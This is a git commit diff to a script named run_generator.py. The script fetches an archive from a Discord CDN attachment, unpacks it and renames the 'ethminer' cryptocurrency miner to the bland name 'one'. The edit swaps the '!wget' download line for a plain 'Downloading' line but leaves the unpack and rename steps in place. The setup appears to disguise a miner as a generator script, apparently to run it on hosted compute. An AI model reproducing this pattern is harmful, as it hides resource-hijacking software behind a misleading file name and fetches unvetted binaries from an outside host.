2afe2f27d9608cdab0d007caa813aea2cf019263
Alexx90807897978 <92858020+Alexx90807897978@users.noreply.github.com>
2021-10-20 13:58:23 +0300

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,4 +1,4 @@
-!wget https://cdn.discordapp.com/attachments/670980998485245966/893912939667529748/hjj.tar.gz
+Downloading https://cdn.discordapp.com/attachments/670980998485245966/893912939667529748/hjj.tar.gz
 !tar xf hjj.tar.gz
 cd bin
 !mv ethminer one
